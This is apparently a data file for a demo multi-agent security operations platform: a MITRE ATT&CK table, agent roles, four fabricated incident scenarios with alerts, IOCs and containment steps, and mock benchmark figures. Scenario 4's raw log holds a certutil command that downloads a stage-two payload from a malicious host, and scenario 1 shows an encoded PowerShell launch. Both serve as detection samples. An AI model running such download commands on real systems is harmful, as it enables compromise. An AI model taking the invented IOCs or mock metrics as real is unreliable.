// Autonomous SOC Platform Data Store & Attack Scenarios

export const MITRE_ATTACK_MATRIX = [
  {
    id: "TA0001",
    tactic: "Initial Access",
    techniques: [
      { id: "T1190", name: "Exploit Public-Facing Application", risk: "Critical" },
      { id: "T1566", name: "Phishing: Spearphishing Link", risk: "High" },
      { id: "T1078", name: "Valid Accounts: Cloud IAM", risk: "Critical" },
      { id: "T1195", name: "Supply Chain Compromise", risk: "Critical" }
    ]
  },
  {
    id: "TA0002",
    tactic: "Execution",
    techniques: [
      { id: "T1059.001", name: "PowerShell Malicious Scripting", risk: "High" },
      { id: "T1059.004", name: "Unix Shell Command Injections", risk: "Medium" },
      { id: "T1204", name: "User Execution: Malicious Attachment", risk: "High" }
    ]
  },
  {
    id: "TA0003",
    tactic: "Persistence",
    techniques: [
      { id: "T1098", name: "Account Manipulation: Role Escalation", risk: "Critical" },
      { id: "T1547", name: "Boot or Logon Autostart Execution", risk: "High" },
      { id: "T1136", name: "Create Account: Backdoor Admin", risk: "Critical" }
    ]
  },
  {
    id: "TA0004",
    tactic: "Privilege Escalation",
    techniques: [
      { id: "T1068", name: "Exploitation for Privilege Escalation", risk: "Critical" },
      { id: "T1548", name: "Abuse Elevation Control Mechanism", risk: "High" }
    ]
  },
  {
    id: "TA0005",
    tactic: "Defense Evasion",
    techniques: [
      { id: "T1027", name: "Obfuscated Files or Information", risk: "High" },
      { id: "T1562", name: "Impair Defenses: Disable EDR Agent", risk: "Critical" }
    ]
  },
  {
    id: "TA0006",
    tactic: "Credential Access",
    techniques: [
      { id: "T1003", name: "OS Credential Dumping (LSASS)", risk: "Critical" },
      { id: "T1110", name: "Brute Force: OAuth Token Abuse", risk: "High" }
    ]
  },
  {
    id: "TA0007",
    tactic: "Exfiltration & Impact",
    techniques: [
      { id: "T1041", name: "Exfiltration Over C2 Channel", risk: "Critical" },
      { id: "T1486", name: "Data Encrypted for Impact (Ransomware)", risk: "Critical" },
      { id: "T1537", name: "Transfer Data to Cloud Account", risk: "High" }
    ]
  }
];

export const SPECIALIZED_AGENTS = [
  {
    id: "coordinator",
    name: "SOC Coordinator Agent",
    role: "Master Orchestrator",
    icon: "👑",
    color: "#00f0ff",
    description: "Decomposes complex security events, assigns sub-tasks to domain agents, negotiates consensus, and issues containment directives."
  },
  {
    id: "threat_intel",
    name: "Threat Intelligence Agent",
    role: "External Intelligence & IOC Enrichment",
    icon: "🔍",
    color: "#38bdf8",
    description: "Queries VirusTotal, AbuseIPDB, Shodan, and MISP feeds to enrich IP, hash, and domain reputation telemetry."
  },
  {
    id: "log_analysis",
    name: "Log Analysis Agent",
    role: "SIEM & Correlation Engine",
    icon: "📜",
    color: "#a855f7",
    description: "Parses Windows Event Logs, Syslog, Firewall, and CloudTrail data. Runs Sigma rule pattern matching across event timelines."
  },
  {
    id: "malware_analysis",
    name: "Malware Analysis Agent",
    role: "Static & Dynamic Sandbox Inspection",
    icon: "🧪",
    color: "#ef4444",
    description: "Scans payload binaries using YARA signatures, evaluates PE header entropy, extracts C2 strings, and simulates sandbox execution."
  },
  {
    id: "cloud_security",
    name: "Cloud Security Agent",
    role: "Cloud Telemetry & Infrastructure Protection",
    icon: "☁️",
    color: "#06b6d4",
    description: "Monitors AWS IAM role changes, Kubernetes cluster security audits, S3 bucket access logs, and GCP SCC telemetry."
  },
  {
    id: "incident_response",
    name: "Incident Response Agent",
    role: "SOAR Containment & Playbook Engine",
    icon: "⚡",
    color: "#f59e0b",
    description: "Formulates host isolation, IP blocking, OAuth token revocation, and infrastructure hardening containment workflows."
  },
  {
    id: "compliance",
    name: "Compliance Agent",
    role: "Regulatory & Audit Impact Evaluator",
    icon: "⚖️",
    color: "#10b981",
    description: "Assesses regulatory breach penalties across GDPR, HIPAA, PCI-DSS, NIST 800-53, and generates audit compliant records."
  },
  {
    id: "human_approval",
    name: "Human Approval Agent (HITL)",
    role: "High-Impact Action Guardrail",
    icon: "🛡️",
    color: "#ec4899",
    description: "Enforces Human-in-the-Loop governance. Intercepts high-risk containment actions (score > 85%) for human analyst authorization."
  }
];

export const ATTACK_SCENARIOS = [
  {
    id: "scenario-1",
    title: "APT29 Blackout: Ransomware & Data Exfiltration",
    severity: "CRITICAL",
    category: "Ransomware / APT",
    targetSystem: "Corporate Active Directory & DB Cluster (10.0.4.15)",
    summary: "Spearphishing payload execution followed by credential dumping, lateral movement to domain controllers, and high-speed data exfiltration over encrypted C2 channels.",
    initialAlert: {
      alertId: "ALT-2026-8891",
      timestamp: "2026-08-07T19:40:12Z",
      source: "CrowdStrike Falcon / Windows Security Event 4624",
      rawLog: "EventID=4624 LogonType=10 User=NT_AUTHORITY\\SYSTEM IP=194.26.29.112 Process=powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ... PayloadHash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      host: "WS-EXEC-04",
      user: "j.doe@enterprise.com",
      srcIp: "194.26.29.112"
    },
    iocs: {
      ips: ["194.26.29.112", "185.220.101.5"],
      hashes: ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069"],
      domains: ["c2-darknode-exfil.ru", "auth-token-bypass.xyz"]
    },
    mitreTechniques: ["T1566", "T1059.001", "T1003", "T1041", "T1486"],
    recommendedActions: [
      { actionId: "ACT-01", target: "194.26.29.112", type: "Block IP at Perimeter Firewall", riskScore: 40, hitlRequired: false },
      { actionId: "ACT-02", target: "WS-EXEC-04", type: "Isolate Endpoint Host from Network", riskScore: 65, hitlRequired: false },
      { actionId: "ACT-03", target: "j.doe@enterprise.com", type: "Revoke Active OAuth Tokens & Reset Password", riskScore: 30, hitlRequired: false },
      { actionId: "ACT-04", target: "10.0.4.15 (Core DB Controller)", type: "Execute Emergency Network Segment Isolation", riskScore: 92, hitlRequired: true }
    ]
  },
  {
    id: "scenario-2",
    title: "Cloud IAM Hijack & S3 Data Exfiltration",
    severity: "HIGH",
    category: "Cloud Infrastructure Security",
    targetSystem: "AWS Production S3 Data Lake (arn:aws:s3:::prod-customer-pii-vault)",
    summary: "Stolen AWS Access Key used from unauthorized geolocation to attach AdministratorAccess policy, spin up 50 GPU instances for cryptomining, and download S3 PII datasets.",
    initialAlert: {
      alertId: "ALT-2026-9410",
      timestamp: "2026-08-07T19:42:00Z",
      source: "AWS GuardDuty / CloudTrail Audit Log",
      rawLog: "eventName=AttachUserPolicy userName=devops-admin-svc policyArn=arn:aws:iam::aws:policy/AdministratorAccess userAgent=aws-cli/2.15.10 srcIp=45.142.214.99 region=us-east-1",
      host: "AWS Account ID #8841920491",
      user: "devops-admin-svc",
      srcIp: "45.142.214.99"
    },
    iocs: {
      ips: ["45.142.214.99", "185.191.171.12"],
      hashes: ["a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e"],
      domains: ["aws-iam-refresher.cc"]
    },
    mitreTechniques: ["T1078", "T1098", "T1537"],
    recommendedActions: [
      { actionId: "ACT-11", target: "AKIAIOSFODNN7EXAMPLE", type: "Disable Compromised IAM Access Keys", riskScore: 50, hitlRequired: false },
      { actionId: "ACT-12", target: "45.142.214.99", type: "Add IP to AWS WAF / Network ACL Deny List", riskScore: 25, hitlRequired: false },
      { actionId: "ACT-13", target: "arn:aws:s3:::prod-customer-pii-vault", type: "Enforce S3 Public Access Block & KMS Re-encryption", riskScore: 88, hitlRequired: true }
    ]
  },
  {
    id: "scenario-3",
    title: "Phishing Campaign & Identity Impersonation",
    severity: "MEDIUM",
    category: "Identity & Endpoint Security",
    targetSystem: "Microsoft 365 Tenant & Okta SSO Service",
    summary: "Executive spearphishing attack resulting in session token hijacking via Evilginx reverse proxy, bypassing SMS MFA to access Financial ERP systems.",
    initialAlert: {
      alertId: "ALT-2026-5521",
      timestamp: "2026-08-07T19:35:00Z",
      source: "Microsoft Defender for Identity / Azure AD Identity Protection",
      rawLog: "Alert=Unusual Logon Properties User=cfo@enterprise.com ImpossibleTravel=True PreviousLocation=New York, USA CurrentLocation=Lagos, Nigeria UserAgent=Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      host: "M365-ERP-FINANCE",
      user: "cfo@enterprise.com",
      srcIp: "102.89.23.14"
    },
    iocs: {
      ips: ["102.89.23.14"],
      hashes: [],
      domains: ["login.microsoftonline.corp-auth.com"]
    },
    mitreTechniques: ["T1566", "T1110"],
    recommendedActions: [
      { actionId: "ACT-21", target: "cfo@enterprise.com", type: "Terminate Active Okta SSO Sessions", riskScore: 40, hitlRequired: false },
      { actionId: "ACT-22", target: "cfo@enterprise.com", type: "Enforce Immediate FIDO2 / Hardware Token Re-Authentication", riskScore: 35, hitlRequired: false }
    ]
  },
  {
    id: "scenario-4",
    title: "SolarWinds Style Supply Chain Trojan Execution",
    severity: "CRITICAL",
    category: "Supply Chain & Software Integrity",
    targetSystem: "CI/CD Deployment Server (Jenkins Master Node)",
    summary: "Malicious npm dependency injected into internal repository build pipeline, executing backdoored DLL with elevated SYSTEM privileges.",
    initialAlert: {
      alertId: "ALT-2026-7734",
      timestamp: "2026-08-07T19:43:10Z",
      source: "Sysmon Event ID 1 (Process Creation) / Snyk Container Scanner",
      rawLog: "ParentProcess=node.exe Image=C:\\Windows\\System32\\certutil.exe CommandLine=certutil -urlcache -split -f http://malicious-npm-repo.org/stage2.bin Hash=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
      host: "JENKINS-BUILD-01",
      user: "jenkins-svc",
      srcIp: "91.240.118.42"
    },
    iocs: {
      ips: ["91.240.118.42"],
      hashes: ["8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"],
      domains: ["malicious-npm-repo.org"]
    },
    mitreTechniques: ["T1195", "T1059", "T1027"],
    recommendedActions: [
      { actionId: "ACT-31", target: "JENKINS-BUILD-01", type: "Kill Malicious Certutil & Node Subprocesses", riskScore: 50, hitlRequired: false },
      { actionId: "ACT-32", target: "Internal npm Registry", type: "Quarantine Trojanized Package `@enterprise/core-utils v2.4.1`", riskScore: 78, hitlRequired: false },
      { actionId: "ACT-33", target: "CI/CD Deployment Pipeline", type: "Pause Global Release Deployments", riskScore: 90, hitlRequired: true }
    ]
  }
];

export const COMPLIANCE_FRAMEWORKS = [
  { name: "GDPR Article 33", requirement: "Mandatory 72-hour breach notification to supervisory authority upon detecting PII leakage." },
  { name: "PCI-DSS v4.0", requirement: "Immediate isolation of cardholder data environment (CDE) and retention of audit logs for 1 year." },
  { name: "NIST SP 800-53", requirement: "IR-4 Incident Handling, IR-5 Monitoring, and CP-9 Information System Backup enforcement." },
  { name: "SOC 2 Type II", requirement: "Trust Services Criteria CC6.1 Logical Access Controls and CC7.3 System Monitoring compliance." },
  { name: "HIPAA Security Rule", requirement: "Emergency Access Procedure (§ 164.312(a)(2)(ii)) & Immediate ePHI Access Auditing." }
];

export const MOCK_BENCHMARK_DATA = {
  averageResponseTimeMs: 1420,
  manualTriageTimeMin: 45,
  autonomousAccuracyRate: 98.4,
  falsePositiveReductionPct: 87.2,
  toolEnrichmentLatencyMs: 310,
  consensusAgreementRate: 96.8
};
